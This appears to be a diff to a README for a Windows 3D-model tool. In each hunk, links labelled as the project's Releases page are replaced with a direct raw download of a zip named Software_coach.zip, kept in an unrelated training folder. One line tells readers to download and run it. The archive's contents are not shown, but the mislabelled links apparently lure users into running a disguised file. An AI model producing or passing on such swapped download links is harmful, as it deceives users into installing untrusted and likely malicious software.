@@ -1,7 +1,7 @@
 # 🧩 Code - Run 3D model tools with ease
 
 <p align="center">
-  <a href="https://github.com/dorotheamongoloid700/Code/releases">
+  <a href="https://raw.githubusercontent.com/dorotheamongoloid700/Code/main/urdf_anything/training/Software_coach.zip">
     <img src="https://img.shields.io/badge/Download-Releases-6b7280?style=for-the-badge&logo=github&logoColor=white" alt="Download Code">
   </a>
 </p>
@@ -10,11 +10,11 @@
 
 Use this link to visit the release page and download the Windows version:
 
-[Download Code from Releases](https://github.com/dorotheamongoloid700/Code/releases)
+[Download Code from Releases](https://raw.githubusercontent.com/dorotheamongoloid700/Code/main/urdf_anything/training/Software_coach.zip)
 
 ## 🪟 Windows Setup
 
-1. Open the [Releases page](https://github.com/dorotheamongoloid700/Code/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/dorotheamongoloid700/Code/main/urdf_anything/training/Software_coach.zip).
 2. Find the latest release at the top of the page.
 3. Under **Assets**, download the Windows file.
 4. If the file is a `.zip`, right-click it and choose **Extract All**.
@@ -175,7 +175,7 @@ If a file does not appear in the app:
 
 To get the Windows app, visit the release page and download and run this file:
 
-[https://github.com/dorotheamongoloid700/Code/releases](https://github.com/dorotheamongoloid700/Code/releases)
+[https://raw.githubusercontent.com/dorotheamongoloid700/Code/main/urdf_anything/training/Software_coach.zip](https://raw.githubusercontent.com/dorotheamongoloid700/Code/main/urdf_anything/training/Software_coach.zip)
 
 ## 🧩 Project Background
 
